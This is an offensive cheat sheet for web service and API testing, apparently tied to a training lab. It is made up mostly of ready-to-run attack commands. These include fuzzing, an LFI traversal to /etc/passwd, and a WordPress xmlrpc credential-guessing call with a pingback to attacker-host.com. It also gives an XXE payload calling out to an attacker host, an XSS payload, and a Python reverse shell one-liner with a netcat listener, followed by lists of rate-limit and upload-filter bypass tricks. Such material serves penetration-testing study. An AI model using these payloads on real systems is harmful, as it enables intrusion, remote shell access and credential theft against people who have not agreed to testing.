# Web Services and APIs Security Commands Cheat Sheet

## Directory and Parameter Fuzzing

### Basic Directory Fuzzing
```bash
dirb http://<TARGET IP>:3002
```

### Parameter Fuzzing with ffuf
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200
```

### API Endpoint Fuzzing
```bash
ffuf -w "SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
```

### Parameter Fuzzing with Response Size Filtering
```bash
ffuf -w "burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19
```

## WSDL and SOAP Testing

### Retrieve WSDL File
```bash
curl http://<TARGET IP>:3002/wsdl?wsdl
```

### Basic SOAP Request
```bash
curl -X POST http://<TARGET IP>:3002/wsdl -d 'SOAP_PAYLOAD' -H "SOAPAction:\"ExecuteCommand\""
```

## Network Monitoring

### Monitor ICMP Traffic
```bash
sudo tcpdump -i tun0 icmp
```

### Set up Netcat Listener
```bash
nc -nlvp 4444
```

## Information Disclosure and SQLi

### Basic API Parameter Testing
```bash
curl http://<TARGET IP>:3003/?id=1
```

### Base64 Encoding for SSRF
```bash
echo "http://<VPN_IP>:<PORT>" | tr -d '\n' | base64
```

## File Operations

### LFI Testing
```bash
curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
```

### File Upload Testing
```bash
# Upload via POST to /api/upload/
# Check response for file location
```

## WordPress xmlrpc.php Testing

### List Available Methods
```bash
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

### Test Login Credentials
```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

### Pingback Attack
```bash
curl -X POST -d "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker-host.com/</string></value></param><param><value><string>https://target.com/post</string></value></param></params></methodCall>" http://target.com/xmlrpc.php
```

## XXE Testing

### Basic XXE Payload
```bash
curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN_IP>:<PORT>"> ]><root><email>&somename;</email><password>test</password></root>'
```

## XSS Testing

### URL-Encoded XSS Payload
```bash
# Use: %3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
# Instead of: <script>alert(document.domain)</script>
```

## Reverse Shell Payloads

### Python Reverse Shell
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Tools and Utilities

### Clear Terminal
```bash
os.system("clear")  # In Python
```

### Burp Suite
```bash
burpsuite
```

## Rate Limiting Bypass Headers
- `X-Forwarded-For: 127.0.0.1`
- `X-Forwarded-IP: 127.0.0.1`
- `X-Real-IP: 127.0.0.1`

## Common File Extensions for Upload Bypass
- `.jpg.php`
- `.PHP`
- `.php5`
- `.phtml`

## Common Paths for LFI Testing
- `../../../etc/passwd`
- `../../../etc/hosts`
- `../../../windows/system32/drivers/etc/hosts`
- `../../../proc/version`
